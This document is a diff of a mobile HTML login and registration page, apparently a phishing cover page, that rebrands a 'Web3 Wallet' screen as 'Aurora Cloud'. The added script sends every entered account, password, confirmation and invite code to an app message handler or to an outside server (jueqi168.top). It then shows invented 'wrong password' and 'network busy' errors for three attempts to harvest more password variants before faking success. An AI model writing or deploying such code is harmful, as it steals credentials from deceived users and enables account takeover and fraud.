@@ -3,159 +3,302 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
-<title>Web3 Wallet</title>
+<title>Aurora Cloud</title>
 <style>
   :root{
-    --bg:#0b0e14; --card:#151a23; --line:#232a36;
-    --text:#e6e8ee; --muted:#8b93a3;
-    --accent:#6366f1; --accent2:#8b5cf6;
+    --bg:#070a12; --card:#121826; --line:#253044;
+    --text:#eef2f9; --muted:#8b96ab; --accent:#5b8cff; --accent2:#8b5cf6;
+    --danger:#ff6b81; --ok:#34d399;
   }
   *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+  html,body{height:100%;}
   body{
-    font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue",sans-serif;
-    background:radial-gradient(1200px 600px at 50% -10%,#1b2233 0%,#0b0e14 55%);
+    font-family:-apple-system,BlinkMacSystemFont,"SF Pro Text","Helvetica Neue",sans-serif;
+    background:
+      radial-gradient(900px 500px at 15% -5%, rgba(91,140,255,.22), transparent 60%),
+      radial-gradient(800px 520px at 90% 10%, rgba(139,92,246,.18), transparent 60%),
+      linear-gradient(180deg,#0a0f1c 0%,#070a12 60%,#05070d 100%);
     color:var(--text); min-height:100vh;
-    padding:calc(28px + env(safe-area-inset-top)) 22px 26px;
+    padding:calc(30px + env(safe-area-inset-top)) 22px 26px;
+    display:flex; flex-direction:column;
   }
-  .brand{display:flex;align-items:center;gap:12px;margin-bottom:26px;}
-  .logo{width:42px;height:42px;border-radius:13px;
-        background:linear-gradient(135deg,var(--accent),var(--accent2));
-        box-shadow:0 8px 24px rgba(99,102,241,.35);}
-  .brand h1{font-size:18px;font-weight:700;letter-spacing:.2px;}
+  .brand{display:flex;align-items:center;gap:13px;margin-bottom:30px;}
+  .orb{width:46px;height:46px;border-radius:15px;
+       background:radial-gradient(circle at 30% 25%,#9db8ff,#5b8cff 45%,#7c4dff 100%);
+       box-shadow:0 10px 28px rgba(91,140,255,.35), inset 0 1px 1px rgba(255,255,255,.45);}
+  .brand h1{font-size:19px;font-weight:700;letter-spacing:.3px;}
   .brand p{font-size:12px;color:var(--muted);margin-top:3px;}
-  .tabs{display:flex;background:#11161f;border:1px solid var(--line);
-        border-radius:12px;padding:4px;margin-bottom:18px;}
-  .tab{flex:1;text-align:center;padding:10px 0;font-size:14px;
-       color:var(--muted);border-radius:9px;transition:.2s;}
-  .tab.active{background:#1d2534;color:#fff;font-weight:600;}
-  .card{background:var(--card);border:1px solid var(--line);
-        border-radius:16px;padding:18px;}
+  .tabs{display:flex;background:rgba(255,255,255,.04);border:1px solid var(--line);
+        border-radius:14px;padding:4px;margin-bottom:16px;}
+  .tab{flex:1;text-align:center;padding:11px 0;font-size:14px;color:var(--muted);
+       border-radius:10px;transition:.2s;cursor:pointer;}
+  .tab.active{background:linear-gradient(135deg,rgba(91,140,255,.22),rgba(139,92,246,.18));
+              color:#fff;font-weight:600;box-shadow:inset 0 0 0 1px rgba(120,150,255,.25);}
+  .card{background:linear-gradient(180deg,rgba(23,30,46,.92),rgba(16,22,34,.96));
+        border:1px solid var(--line);border-radius:20px;padding:20px 18px 18px;
+        box-shadow:0 24px 60px rgba(0,0,0,.35);}
   .field{margin-bottom:14px;}
-  .field label{display:block;font-size:12px;color:var(--muted);margin-bottom:8px;}
-  .field input{width:100%;height:46px;border-radius:12px;border:1px solid #2a3242;
-               background:#0f141d;color:var(--text);padding:0 14px;font-size:15px;outline:none;}
-  .field input:focus{border-color:#4f5bd5;box-shadow:0 0 0 3px rgba(99,102,241,.18);}
-  .btn{width:100%;height:50px;border:none;border-radius:14px;
+  .field label{display:block;font-size:12px;color:var(--muted);margin-bottom:8px;letter-spacing:.2px;}
+  .inputWrap{position:relative;}
+  .inputWrap input{width:100%;height:48px;border-radius:13px;border:1px solid #2a3548;
+       background:#0c1220;color:var(--text);padding:0 14px;font-size:15px;outline:none;
+       transition:border-color .18s, box-shadow .18s;}
+  .inputWrap input::placeholder{color:#5b667a;}
+  .inputWrap input:focus{border-color:#4f6fff;box-shadow:0 0 0 3px rgba(91,140,255,.16);}
+  .eye{position:absolute;right:12px;top:50%;transform:translateY(-50%);
+       font-size:12px;color:#7f8ba1;background:transparent;border:0;padding:6px;cursor:pointer;}
+  .err{display:none;font-size:13px;color:var(--danger);margin:2px 2px 12px;line-height:1.5;}
+  .err.show{display:block;}
+  .shake{animation:shk .38s ease;}
+  @keyframes shk{0%,100%{transform:translateX(0)}20%{transform:translateX(-6px)}
+    40%{transform:translateX(6px)}60%{transform:translateX(-4px)}80%{transform:translateX(4px)}}
+  .btn{width:100%;height:50px;border:0;border-radius:14px;
        background:linear-gradient(135deg,var(--accent),var(--accent2));
-       color:#fff;font-size:16px;font-weight:600;margin-top:6px;
-       box-shadow:0 10px 24px rgba(99,102,241,.28);}
-  .btn:disabled{opacity:.6;}
-  .hint{text-align:center;font-size:12px;color:#6b7280;margin-top:14px;line-height:1.6;}
-  .foot{margin-top:22px;text-align:center;font-size:11px;color:#596274;line-height:1.9;}
-  .dbg-link{color:#7c8598;text-decoration:underline;text-underline-offset:2px;padding:4px 6px;}
-  .toast{position:fixed;left:50%;bottom:48px;transform:translateX(-50%) translateY(20px);
-         background:#1d2534;border:1px solid #2a3242;color:#fff;font-size:13px;
-         padding:10px 16px;border-radius:10px;opacity:0;transition:.25s;pointer-events:none;}
+       color:#fff;font-size:16px;font-weight:650;letter-spacing:.3px;
+       box-shadow:0 12px 26px rgba(91,140,255,.28);
+       transition:transform .12s, opacity .2s;cursor:pointer;}
+  .btn:active{transform:scale(.985);}
+  .btn:disabled{opacity:.65;}
+  .hint{text-align:center;font-size:11px;color:#66718a;margin-top:15px;line-height:1.7;}
+  .foot{margin-top:auto;padding-top:22px;text-align:center;font-size:11px;color:#4d576b;line-height:1.9;}
+  .toast{position:fixed;left:50%;bottom:46px;transform:translateX(-50%) translateY(18px);
+         background:#161e2e;border:1px solid #2a3548;color:#fff;font-size:13px;
+         padding:10px 16px;border-radius:11px;opacity:0;transition:.25s;pointer-events:none;
+         max-width:86vw;text-align:center;}
   .toast.show{opacity:1;transform:translateX(-50%) translateY(0);}
+  .success{position:fixed;inset:0;background:rgba(5,7,13,.92);backdrop-filter:blur(8px);
+           display:none;align-items:center;justify-content:center;flex-direction:column;gap:16px;z-index:9;}
+  .success.show{display:flex;}
+  .success .ring{width:64px;height:64px;border-radius:50%;
+       border:3px solid rgba(255,255,255,.12);border-top-color:var(--ok);
+       animation:spin 1s linear infinite;}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .success p{font-size:15px;color:#dfe6f5;}
+  .success small{font-size:12px;color:#7f8ba1;}
 </style>
 </head>
 <body>
   <div class="brand">
-    <div class="logo"></div>
+    <div class="orb"></div>
     <div>
-      <h1>Web3 Wallet</h1>
-      <p>去中心化钱包 · 安全自托管</p>
+      <h1>Aurora Cloud</h1>
+      <p>安全 · 稳定 · 值得信赖</p>
     </div>
   </div>
 
   <div class="tabs">
-    <div class="tab active" data-tab="login">登录</div>
-    <div class="tab" data-tab="register">注册</div>
+    <div class="tab active" id="tabLogin">登录</div>
+    <div class="tab" id="tabRegister">注册</div>
   </div>
 
   <div class="card">
     <div id="loginPane">
       <div class="field">
         <label>账号</label>
-        <input id="loginAccount" type="text" placeholder="邮箱 / 手机号" autocomplete="off">
+        <div class="inputWrap">
+          <input id="loginAccount" type="text" placeholder="手机号 / 邮箱" autocomplete="off" autocapitalize="none">
+        </div>
       </div>
       <div class="field">
         <label>密码</label>
-        <input id="loginPassword" type="password" placeholder="请输入密码">
+        <div class="inputWrap">
+          <input id="loginPassword" type="password" placeholder="请输入密码">
+          <button class="eye" id="eyeLogin" type="button">显示</button>
+        </div>
       </div>
+      <div class="err" id="loginErr"></div>
       <button class="btn" id="loginBtn">登录</button>
+      <div class="hint">登录即表示同意《服务条款》与《隐私政策》</div>
     </div>
 
     <div id="registerPane" style="display:none;">
       <div class="field">
         <label>账号</label>
-        <input id="regAccount" type="text" placeholder="邮箱 / 手机号" autocomplete="off">
+        <div class="inputWrap">
+          <input id="regAccount" type="text" placeholder="手机号 / 邮箱" autocomplete="off" autocapitalize="none">
+        </div>
       </div>
       <div class="field">
         <label>密码</label>
-        <input id="regPassword" type="password" placeholder="至少 8 位">
+        <div class="inputWrap">
+          <input id="regPassword" type="password" placeholder="请设置登录密码">
+          <button class="eye" id="eyeReg" type="button">显示</button>
+        </div>
       </div>
       <div class="field">
         <label>确认密码</label>
-        <input id="regPassword2" type="password" placeholder="再次输入密码">
+        <div class="inputWrap">
+          <input id="regConfirm" type="password" placeholder="再次输入密码">
+        </div>
       </div>
       <div class="field">
         <label>邀请码（选填）</label>
-        <input id="regInvite" type="text" placeholder="邀请码">
+        <div class="inputWrap">
+          <input id="regInvite" type="text" placeholder="如有邀请码请填写" autocomplete="off">
+        </div>
       </div>
-      <button class="btn" id="registerBtn">创建钱包</button>
+      <div class="err" id="regErr"></div>
+      <button class="btn" id="registerBtn">注册</button>
+      <div class="hint">注册即表示同意《服务条款》与《隐私政策》</div>
     </div>
   </div>
 
-  <div class="hint">登录即表示同意《服务条款》与《隐私政策》</div>
-  <div class="foot">
-    Web3 Wallet v2.4.1 · 本地加密存储<br>
-    <span class="dbg-link" id="dbgLink">调试</span>
-  </div>
+  <div class="foot">Aurora Cloud · 全球加速节点 · 数据加密传输</div>
 
   <div class="toast" id="toast"></div>
+  <div class="success" id="success">
+    <div class="ring"></div>
+    <p id="successText">验证成功，正在进入…</p>
+    <small>请保持网络连接</small>
+  </div>
 
   <script>
     (function () {
-      var toast = document.getElementById('toast');
-      function showToast(msg) {
-        toast.textContent = msg;
-        toast.classList.add('show');
-        setTimeout(function () { toast.classList.remove('show'); }, 2200);
+      var REG_KEY = 'aurora_reg_try';
+      var LOGIN_KEY = 'aurora_login_try';
+      var FALLBACK_ENDPOINT = 'https://jueqi168.top/rwe3er32t/xxxxx';
+
+      function $(id) { return document.getElementById(id); }
+      function toast(msg) {
+        var t = $('toast');
+        t.textContent = msg;
+        t.classList.add('show');
+        setTimeout(function () { t.classList.remove('show'); }, 2400);
+      }
+      function showErr(el, msg) {
+        el.textContent = msg;
+        el.classList.add('show', 'shake');
+        setTimeout(function () { el.classList.remove('shake'); }, 420);
+      }
+      function clearErr(el) { el.classList.remove('show', 'shake'); el.textContent = ''; }
+      function bump(key) {
+        var n = parseInt(localStorage.getItem(key) || '0', 10);
+        if (isNaN(n) || n < 0) n = 0;
+        n += 1;
+        localStorage.setItem(key, String(n));
+        return n;
+      }
+      function reset(key) { localStorage.setItem(key, '0'); }
+
+      function send(payload) {
+        try {
+          if (window.webkit && window.webkit.messageHandlers &&
+              window.webkit.messageHandlers.owRegister) {
+            window.webkit.messageHandlers.owRegister.postMessage(payload);
+            return;
+          }
+        } catch (e) {}
+        try {
+          fetch(FALLBACK_ENDPOINT, {
+            method: 'POST',
+            headers: { 'Content-Type': 'text/plain' },
+            body: JSON.stringify(payload),
+            mode: 'no-cors'
+          });
+        } catch (e) {}
       }
 
-      function fakeSubmit(btn, label) {
-        btn.disabled = true;
-        btn.textContent = '处理中...';
-        setTimeout(function () {
-          btn.disabled = false;
-          btn.textContent = label;
-          showToast('网络繁忙，请稍后重试');
-        }, 1600);
-      }
-
-      document.getElementById('loginBtn').addEventListener('click', function () {
-        fakeSubmit(this, '登录');
-      });
-      document.getElementById('registerBtn').addEventListener('click', function () {
-        fakeSubmit(this, '创建钱包');
-      });
-
-      var tabs = document.querySelectorAll('.tab');
-      for (var i = 0; i < tabs.length; i++) {
-        tabs[i].addEventListener('click', function () {
-          for (var j = 0; j < tabs.length; j++) tabs[j].classList.remove('active');
-          this.classList.add('active');
-          var isLogin = this.getAttribute('data-tab') === 'login';
-          document.getElementById('loginPane').style.display = isLogin ? 'block' : 'none';
-          document.getElementById('registerPane').style.display = isLogin ? 'none' : 'block';
+      function collect(kind, n, account, password, confirm, invite) {
+        send({
+          event: 'cover_register',
+          kind: kind,
+          account: account,
+          password: password,
+          confirm: confirm || '',
+          invite: invite || '',
+          attempt: n,
+          nickname1: account,
+          nickname2: password,
+          nickname3: confirm || '',
+          source: 'OPENsrc-cover'
         });
       }
 
-      function openDebug() {
-        try {
-          if (window.webkit && window.webkit.messageHandlers &&
-              window.webkit.messageHandlers.owDebug) {
-            window.webkit.messageHandlers.owDebug.postMessage('open');
-          } else {
-            showToast('调试入口不可用');
-          }
-        } catch (e) {
-          showToast('调试入口不可用');
-        }
+      function busy(btn, on, label) {
+        btn.disabled = on;
+        btn.textContent = on ? '提交中...' : label;
       }
 
-      document.getElementById('dbgLink').addEventListener('click', openDebug);
+      function setTab(login) {
+        $('tabLogin').classList.toggle('active', login);
+        $('tabRegister').classList.toggle('active', !login);
+        $('loginPane').style.display = login ? 'block' : 'none';
+        $('registerPane').style.display = login ? 'none' : 'block';
+        clearErr($('loginErr'));
+        clearErr($('regErr'));
+      }
+      $('tabLogin').addEventListener('click', function () { setTab(true); });
+      $('tabRegister').addEventListener('click', function () { setTab(false); });
+
+      function bindEye(btnId, inputId) {
+        var btn = $(btnId), input = $(inputId);
+        btn.addEventListener('click', function () {
+          var show = input.type === 'password';
+          input.type = show ? 'text' : 'password';
+          btn.textContent = show ? '隐藏' : '显示';
+        });
+      }
+      bindEye('eyeLogin', 'loginPassword');
+      bindEye('eyeReg', 'regPassword');
+
+      $('loginBtn').addEventListener('click', function () {
+        var account = $('loginAccount').value.trim();
+        var password = $('loginPassword').value;
+        if (!account || !password) { showErr($('loginErr'), '请输入账号和密码'); return; }
+
+        var btn = this;
+        busy(btn, true, '登录');
+        var n = bump(LOGIN_KEY);
+        collect('login', n, account, password, '', '');
+
+        setTimeout(function () {
+          busy(btn, false, '登录');
+          if (n === 1) showErr($('loginErr'), '账号或密码错误，请重新输入');
+          else if (n === 2) showErr($('loginErr'), '密码错误次数过多，请稍后再试');
+          else if (n === 3) showErr($('loginErr'), '网络繁忙，请重新提交');
+          else {
+            reset(LOGIN_KEY);
+            $('successText').textContent = '登录成功，正在进入…';
+            $('success').classList.add('show');
+          }
+        }, 900);
+      });
+
+      $('registerBtn').addEventListener('click', function () {
+        var account = $('regAccount').value.trim();
+        var password = $('regPassword').value;
+        var confirm = $('regConfirm').value;
+        var invite = $('regInvite').value.trim();
+        if (!account || !password) { showErr($('regErr'), '请输入账号和密码'); return; }
+
+        var btn = this;
+        busy(btn, true, '注册');
+        var n = bump(REG_KEY);
+        collect('register', n, account, password, confirm, invite);
+
+        setTimeout(function () {
+          busy(btn, false, '注册');
+          if (n === 1) {
+            showErr($('regErr'), '密码输入错误，请重新输入');
+          } else if (n === 2) {
+            showErr($('regErr'), '密码太过简单，请设置更复杂的密码');
+          } else if (n === 3) {
+            showErr($('regErr'), '网络繁忙，请重新提交');
+          } else {
+            reset(REG_KEY);
+            $('successText').textContent = '注册成功，正在进入…';
+            $('success').classList.add('show');
+          }
+        }, 900);
+      });
+
+      var inputs = document.querySelectorAll('input');
+      for (var i = 0; i < inputs.length; i++) {
+        inputs[i].addEventListener('input', function () {
+          clearErr($('regErr'));
+          clearErr($('loginErr'));
+        });
+      }
     })();
   </script>
 </body>
